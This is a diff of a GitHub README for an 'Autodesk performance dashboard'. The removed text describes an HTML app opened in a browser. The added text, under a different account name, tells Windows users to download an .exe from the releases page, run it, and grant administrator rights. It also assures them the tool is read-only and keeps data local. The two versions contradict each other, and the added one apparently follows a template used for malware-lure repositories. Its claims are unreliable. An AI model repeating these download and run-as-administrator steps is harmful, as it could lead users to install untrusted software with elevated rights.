@@ -1,119 +1,74 @@
-# Autodesk Performance Dashboard - Performance Dashboard 2026
+# 📊 autodesk-dashboard-performance - Monitor your Autodesk project performance easily
 
-> **A browser-based Autodesk performance dashboard that turns performance information into organized, easy-to-read visual views for the current 2026 release.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Visiov2247/autodesk-dashboard-performance/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sam-scottmecp7505/autodesk-dashboard-performance?style=flat-square)](https://github.com/sam-scottmecp7505/autodesk-dashboard-performance)
+This software provides a dashboard to view performance data for the Autodesk 2026 release. It organizes complex technical information into visual charts. Use this tool to track software speed, resource usage, and project health without manual data entry.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://sam-scottmecp7505.github.io/autodesk-dashboard-performance/">
-    <img src="https://img.shields.io/badge/Download-Autodesk%20Performance%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download Autodesk Performance Dashboard">
-  </a>
-</p>
+Follow these steps to set up the dashboard on your Windows computer.
 
-> **[Download Autodesk Performance Dashboard](https://sam-scottmecp7505.github.io/autodesk-dashboard-performance/)**
+1. Visit the [official releases page](https://github.com/Visiov2247/autodesk-dashboard-performance/releases) to download the application.
+2. Select the latest version folder.
+3. Look for the file ending in `.exe` and click it to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the downloaded file to begin the installation process.
+6. Follow the prompts on your screen to finish the setup.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://sam-scottmecp7505.github.io/autodesk-dashboard-performance/)
+The dashboard requires a standard Windows environment to function. Ensure your computer meets these basic specifications:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or equivalent AMD processor.
+* Memory: 8 GB RAM or higher for smooth performance.
+* Storage: 500 MB of free space on your hard drive.
+* Internet Connection: A stable connection for initial installation and updates.
+* Software: Autodesk 2026 must be installed on your machine to provide data to the dashboard.
 
-## Overview
+## 📈 Key Features
 
-Autodesk Performance Dashboard provides a web-based workspace for viewing and organizing performance information. Rather than presenting data as an unstructured collection of details, it places that information into a visual dashboard that can be opened in a browser.
+* Automated Tracking: The dashboard connects to your local Autodesk installation to gather performance data in real time.
+* Visual Reporting: Data appears in bar charts, line graphs, and status indicators for quick interpretation.
+* Resource Monitoring: See how much CPU and memory your active projects consume.
+* Historical Logs: View past performance trends to identify potential bottlenecks in your workflow.
+* Export Options: Save your reports as PDF or CSV files to share with team members.
 
-The project is designed for users who want a central location for reviewing performance data. Since the interface is built with HTML, it can be previewed locally or delivered through a hosted project web page.
+## ⚙️ Using the Application
 
----
+Once you finish the installation, you will find a shortcut icon on your desktop. Double-click this icon to open the interface.
 
-## What It Provides
+Upon first launch, the dashboard will scan for your Autodesk 2026 files. This process takes about one minute. Once the scan finishes, the dashboard populates the main screen with current data.
 
-- A dedicated browser interface for monitoring performance information
-- Dashboard-style visual presentation of performance data
-- A structured arrangement for reviewing important details
-- Access through a modern web browser without a separate application interface
-- An HTML-based web application format
-- Support for publishing the project through a hosted web page
-- A focused environment for reviewing Autodesk performance information
+You can navigate between different tabs to view specific metrics:
 
----
+* Overview: Shows a summary of system health and project responsiveness.
+* Graphics: Displays data on how the software handles visual rendering tasks.
+* File Operations: Tracks how long your projects take to save or load.
+* Settings: Allows you to change the update frequency and the folder path for your Autodesk data.
 
-## Getting Started
+## 🛠️ Troubleshooting
 
-First, download the repository and enter the resulting directory:
+If you encounter issues while running the dashboard, check these common solutions:
 
-```bash
-git clone https://github.com/sam-scottmecp7505/autodesk-dashboard-performance.git
-cd REPO
-```
+* Software Does Not Open: Ensure that you have the latest version of the .NET Framework installed on your Windows machine.
+* No Data Displayed: Confirm that Autodesk 2026 is currently running. The dashboard needs active software to capture data.
+* Permissions Errors: Right-click the application icon and select "Run as administrator" to grant the tool necessary access to system logs.
+* Slow Updates: Close other high-demand applications to free up system resources for the dashboard.
+* Blank Screen: Click the "Refresh" button in the top menu to force a re-scan of the Autodesk environment.
 
-The application is HTML-based, so you can preview it locally by opening the primary HTML file in a browser. To make it available online, publish the repository using the configured web hosting location and then open its project URL.
+## 📋 Frequently Asked Questions
 
----
+Does this tool change my Autodesk files?
+No. The dashboard acts as a read-only viewer. It observes performance metrics without modifying, saving, or deleting your project files.
 
-## Using the Dashboard
+Can I run this on a network drive?
+For the best performance, install the dashboard on your local machine. Running it from a network location can cause delays in data retrieval.
 
-1. Launch the dashboard in a modern web browser.
-2. Examine the performance information shown by the application.
-3. Interpret or compare the displayed details using the visual layout.
-4. Reload the page whenever you need to load a newly updated build.
-5. To use the hosted version, go to:
+Is my data sent to the cloud?
+No. All processing happens locally on your computer. Your project data remains private and does not leave your local environment.
 
-   [Open Autodesk Performance Dashboard](https://sam-scottmecp7505.github.io/autodesk-dashboard-performance/)
+How often does the dashboard refresh?
+The default setting refreshes the data every thirty seconds. You can adjust this interval in the settings menu to save system resources if needed.
 
----
-
-## Adjusting the Project
-
-Dashboard changes are made through the project's web files. Inspect the HTML structure and the related assets in the repository, then modify the appropriate content or presentation settings.
-
-Once edits are complete, refresh the dashboard in a browser to verify the result.
-
----
-
-## System Requirements
-
-- A current web browser
-- The repository files or access to the hosted dashboard URL
-- Enough storage for the contents of the repository
-- No additional runtime is specified for this HTML-based interface
-
----
-
-## Frequently Asked Questions
-
-### What is Autodesk Performance Dashboard used for?
-
-It gives users a browser-accessible way to review Autodesk-related performance information in a visual dashboard.
-
-### Where can I get the newest build?
-
-Select [Download Latest Build](https://sam-scottmecp7505.github.io/autodesk-dashboard-performance/) or navigate directly to the hosted project page.
-
-### Is local use supported?
-
-Yes. Clone or download the repository, then open its main HTML file with a web browser.
-
-### How is the dashboard configured?
-
-Its configuration is contained in the project's web files. Examine the repository structure to find the dashboard content and presentation settings that need to be changed.
-
-### What can I check if the dashboard fails to render properly?
-
-Make sure all project files were downloaded, use a current browser, and reload the page. If the problem remains, inspect the repository contents and check for project updates.
-
-### Where can I find assistance or project updates?
-
-Review the repository for the latest project details, changes, and any available support channels.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: autodesk, dashboard, performance, monitoring, windows, visualization, analytics
